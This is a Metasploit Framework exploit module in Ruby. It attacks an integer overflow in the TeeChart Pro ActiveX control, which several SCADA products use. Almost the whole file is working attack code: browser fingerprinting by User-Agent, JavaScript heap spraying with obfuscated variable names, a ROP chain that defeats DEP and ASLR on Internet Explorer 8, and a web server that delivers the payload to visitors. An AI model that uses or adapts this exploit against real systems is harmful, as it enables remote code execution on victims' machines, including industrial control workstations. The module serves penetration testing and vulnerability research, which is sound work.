##
# $Id: teechart_pro.rb 13522 2011-08-11 11:17:30Z swtornio $
##

###
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super( update_info(info,
			'Name'           => 'TeeChart Professional ActiveX Control <= 2010.0.0.3 Trusted Integer Dereference',
			'Description'    => %q{
					This module exploits a integer overflow in TeeChart Pro ActiveX control. When
				sending an overly large/negative integer value to the AddSeries() property of
				TeeChart2010.ocx, the code will perform an arithemetic operation that wraps the
				value and is later directly trusted and called upon.

				This module has been designed to bypass DEP only under IE8. Multiple versions
				(including the latest version) are affected by this vulnerability that date back to
				as far as 2001.

				The following controls are vulnerable:

				TeeChart5.ocx Version 5.0.1.0 (clsid: B6C10489-FB89-11D4-93C9-006008A7EED4);
				TeeChart6.ocx Version 6.0.0.5 (clsid: 536600D3-70FE-4C50-92FB-640F6BFC49AD);
				TeeChart7.ocx Version 7.0.1.4 (clsid: FAB9B41C-87D6-474D-AB7E-F07D78F2422E);
				TeeChart8.ocx Version 8.0.0.8 (clsid: BDEB0088-66F9-4A55-ABD2-0BF8DEEC1196);
				TeeChart2010.ocx Version 2010.0.0.3 (clsid: FCB4B50A-E3F1-4174-BD18-54C3B3287258).

				The controls are deployed under several SCADA based systems including:

				Unitronics OPC server v1.3;
				BACnet Operator Workstation Version 1.0.76
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					# twitter.com/net__ninja
					'mr_me <steventhomasseeley[at]gmail.com>', # initial discovery/msf module
				 ],
			'Version'        => '$Revision: 13522 $',
			'References'     =>
				[
					#[ 'CVE', '?' ],
					[ 'OSVDB', '74446'],
					[ 'URL', 'http://www.stratsec.net/Research/Advisories/TeeChart-Professional-Integer-Overflow'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', {} ],
					# For exploitation we need to calculate a value for EDX:
					# <target address> - EAX / 4 = address to place in edx via signed integar
					# 0x0c0c0c0c - 0x023FB8F4 = 0x09CC5318 / 4 = 0x027314C6 = decimal: 41096390
					[
						'Windows XP SP0-SP3 (IE6/IE7)',
						{ 
							'Ret' => 0x027314C6
						}
					],
					# Windows XP target + IE8 + JAVA = ASLR/DEP Bypass
					# 0x09442020- 0x0326B8F4 = 61D672C/4 = 18759CB
					[
						'Windows XP SP0-SP3 + JAVA + DEP bypass (IE8)',
						{
							'Ret' => 0x014E59CB,
							# 0x09442020-0x2c+4 (compensate for CALL [EAX+2C] + 1st gadget) = 0x09441FF8
							# get back to the 2nd of rop.
							'Pivot' => 0x09441FF8
						}
					],
					# Windows 7 target + IE8 + JAVA = ASLR/DEP Bypass
					# 0x16672020 - 0x040AB8F4/4 =  0x049719CB 
					[
						'Windows 7 + JAVA + DEP bypass (IE8)',
						{ 
							'Ret' => 0x049719CB,
							# 0x16672020-0x2c+4 (compensate for CALL [EAX+2C] + 1st gadget) = 0x16671FF8
							# get back to the 2nd of rop.
							'Pivot' => 0x16671FF8
						}
					]
				],
			'DisclosureDate' => 'Aug 11 2011',
			'DefaultTarget'  => 0))
	end

	def junk
		return rand_text_alpha(4).unpack("L")[0].to_i
	end

	def on_request_uri(cli, request)
		#Set target manually or automatically
		my_target = target
		if my_target.name == 'Automatic'
			agent = request.headers['User-Agent']
			if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
				my_target = targets[1]
			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
				my_target = targets[1]
			elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8\.0/
				my_target = targets[2]
			elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8\.0/
				my_target = targets[3]
			end
		end

		print_status("Target selected: #{my_target.name}") if datastore['VERBOSE']

		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# align stack
		retn = Rex::Text.to_unescape([0x7C3410C4].pack('V*'))
		pop_pop_retn = Rex::Text.to_unescape([0x7C3410C2].pack('V*'))

		# shellcode
		sc = Rex::Text.to_unescape(p.encoded)

		# Randomize ALL the javascript variable names.
		rand1    = rand_text_alpha(rand(100) + 1)
		rand2    = rand_text_alpha(rand(100) + 1)
		rand3    = rand_text_alpha(rand(100) + 1)
		rand4    = rand_text_alpha(rand(100) + 1)
		rand5    = rand_text_alpha(rand(100) + 1)
		rand6    = rand_text_alpha(rand(100) + 1)
		rand7    = rand_text_alpha(rand(100) + 1)
		rand8    = rand_text_alpha(rand(100) + 1)
		rand9    = rand_text_alpha(rand(100) + 1)
		rand10   = rand_text_alpha(rand(100) + 1)
		j_applet = rand_text_alpha(rand(100) + 1)

		if my_target.name =~ /IE6/ or my_target.name =~ /IE7/
			js = <<-EOF
			var #{rand3} = unescape('#{sc}');

			var #{rand4} = unescape('%u0c0c%u0c0c');
			var #{rand5} = 20;
			var #{rand6} = #{rand5} + #{rand3}.length;
			while(#{rand4}.length < #{rand6}) {
				#{rand4} += #{rand4};
			}
			var #{rand7} = #{rand4}.substring(0, #{rand6});
			var #{rand8} = #{rand4}.substring(0, #{rand4}.length - #{rand6});
			while((#{rand8}.length + #{rand6}) < 0x50000) {
    			#{rand8} = #{rand8} + #{rand8} + #{rand7};
			}
			#{rand10}=new Array();
			for(#{rand9}=0; #{rand9}<200; #{rand9}++){
				#{rand10}[#{rand9}] = #{rand8} + #{rand3};
			}

			function #{rand2}()
			{
				#{rand1}.AddSeries(#{target.ret});
			} 
			EOF
		end

		#http://vreugdenhilresearch.nl/Pwn2Own-2010-Windows7-InternetExplorer8.pdf
		if my_target.name =~ /IE8/
			# thanks to corelanc0d3r & mona.py :^) for the universal aslr/dep bypass (msvcr71.dll)
			# https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/
			rop_gadgets = [
				my_target['Pivot'],# Pivot back EAX for ESP control
				0x7C342643,  # XCHG EAX,ESP; POP EDI; ; ADD BYTE PTR DS:[EAX],AL; POP ECX; RETN 
				0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
				0x7c37a140,  # Make EAX readable
				0x7c37591f,  # PUSH ESP # ... # POP ECX # POP EBP # RETN (MSVCR71.dll)
				0x41414141,  # EBP (filler)
				0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
				0x7c37a140,  # <- *&VirtualProtect()
				0x7c3530ea,  # MOV EAX,DWORD PTR DS:[EAX] # RETN (MSVCR71.dll)
				0x7c346c0b,  # Slide, so next gadget would write to correct stack location
				0x7c376069,  # MOV [ECX+1C],EAX # P EDI # P ESI # P EBX # RETN (MSVCR71.dll)
				0x41414141,  # EDI (filler)
				0x41414141,  # will be patched at runtime (VP), then picked up into ESI
				0x41414141,  # EBX (filler)
				0x7c376402,  # POP EBP # RETN (msvcr71.dll)
				0x7c345c30,  # ptr to 'push esp #  ret ' (from MSVCR71.dll)
				0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
				0xfffffdff,  # size 0x00000201 -> ebx, modify if needed
				0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)
				0x7c354901,  # POP EBX # RETN (MSVCR71.dll)
				0xffffffff,  # pop value into ebx
				0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)
				0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)
				0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)
				0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)
				0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)
				0x7c34b8d8,  # ROP NOP (-> edi)
				0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)
				0xffffffc0,  # value to negate, target value : 0x00000040, target: edx
				0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)
				0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)
				0x90909090,  # NOPS (-> eax)
				0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)
			].pack('V*')

			rop = Rex::Text.to_unescape(rop_gadgets)

			custom_js = <<-EOF
			function #{rand3}(){
				#{rand5} = new heapLib.ie(0x20000);
				var #{rand6} = unescape('#{rop}');
				#{rand6} += unescape('#{sc}');
				while(#{rand6}.length <= 0xffc) #{rand6} += unescape('#{retn}')
				while(#{rand6}.length < 0x1000) #{rand6} += unescape('#{pop_pop_retn}')
				var #{rand7} = #{rand6};
				while(#{rand7}.length < 0x40000) #{rand7} += #{rand7};
				#{rand8} = #{rand7}.substring(2, 0x40000 - 0x21);
				for(var i = 0; i < 0x400; i++) {
					#{rand5}.alloc(#{rand8});
				}
			}

			function #{rand2}(){ 
				#{rand3}();
				#{rand1}.AddSeries(#{my_target.ret});
			}
			EOF

			js = heaplib(custom_js)
		end

		content = <<-EOF
		<object classid='clsid:FCB4B50A-E3F1-4174-BD18-54C3B3287258' id='#{rand1}' ></object>
		<script language='JavaScript' defer>
		#{js}
		</script>
		<body onload="JavaScript: return #{rand2}();">
		<body>
		</html>
		EOF


		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		#Remove the extra tabs from content
		content = content.gsub(/^\t\t/, '')

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end
end